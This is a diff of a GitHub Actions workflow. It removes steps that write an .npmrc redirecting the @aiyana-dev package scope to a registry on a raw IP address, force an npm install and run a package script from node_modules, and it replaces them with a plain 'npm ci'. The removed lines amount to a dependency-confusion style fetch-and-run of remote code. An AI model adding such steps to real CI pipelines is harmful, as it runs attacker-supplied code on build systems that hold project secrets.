@@ -5,20 +5,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-
       - name: Setup Node.js
         uses: actions/setup-node@v3
         with:
           node-version: '18'
-
-      - name: Create malicious .npmrc file
-        run: echo "@aiyana-dev:registry=http://34.227.190.3:4873" > .npmrc
-
-      - name: Force clean install and attempt installation
-        run: |
-          rm -rf node_modules
-          npm cache clean --force
-          npm install
-
-      - name: Execute the package script (will not be reached if npm install fails)
-        run: node ./node_modules/@aiyana-dev/legit-package/index.js
+      - name: Attempt to install packages
+        run: npm ci
